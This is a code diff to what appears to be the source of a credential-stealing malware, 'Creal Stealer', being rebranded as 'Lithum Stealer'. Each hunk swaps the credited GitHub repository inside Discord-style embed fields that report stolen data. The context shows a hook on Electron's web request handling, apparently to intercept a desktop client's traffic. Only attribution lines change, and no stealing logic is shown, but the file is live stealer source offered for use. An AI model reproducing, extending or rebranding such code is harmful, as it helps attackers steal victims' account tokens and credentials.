@@ -355,7 +355,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Lithum Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                value: `[Lithum Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Reaper513/lithum-stealer)`,
                 inline: !0
             }, {
                 name: "Creal Files",
@@ -448,7 +448,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Creal Stealer  <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                    value: `[Creal Stealer  <a:mavikirmizi:853238372591599617>](https://github.com/Reaper513/lithum-stealer)`,
                     inline: !0
                 }, {
                     name: "Creal Files",
@@ -634,7 +634,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                    value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Reaper513/lithum-stealer)`,
                     inline: !0
                 }, {
                     name: "Creal Files",
@@ -719,7 +719,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                        value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Reaper513/lithum-stealer)`,
                         inline: !0
                     }, {
                         name: "Creal Files",
@@ -806,7 +806,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                        value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Reaper513/lithum-stealer)`,
                         inline: !0
                     }, {
                         name: "Creal Files",
